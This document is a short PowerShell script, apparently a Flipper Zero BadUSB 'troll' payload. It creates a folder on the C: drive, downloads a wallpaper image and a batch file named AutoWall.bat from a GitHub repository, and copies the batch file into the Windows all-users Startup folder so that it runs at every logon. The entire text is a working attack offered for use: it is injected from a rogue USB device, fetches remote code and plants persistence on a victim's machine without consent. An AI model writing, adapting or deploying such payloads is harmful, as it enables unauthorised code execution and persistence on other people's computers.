$folderPath = "C:\AutoWall"
if (-Not (Test-Path -Path $folderPath)) {New-Item -Path $folderPath -ItemType Directory}
$fileUrl = "https://raw.githubusercontent.com/8ad3rror/Flipper-Zero/refs/heads/main/BadUSB/Troll/TrolloWallpaper/trollo.jpg"
$filePath = "$folderPath\trollo.jpg"
$fileUrl2 = "https://github.com/8ad3rror/Flipper-Zero/raw/refs/heads/main/BadUSB/Troll/TrolloWallpaper/AutoWall.bat"
$filePath2 = "$folderPath\AutoWall.bat"
Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
Invoke-WebRequest -Uri $fileUrl2 -OutFile $filePath2
Copy-Item "C:\AutoWall\AutoWall.bat" -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
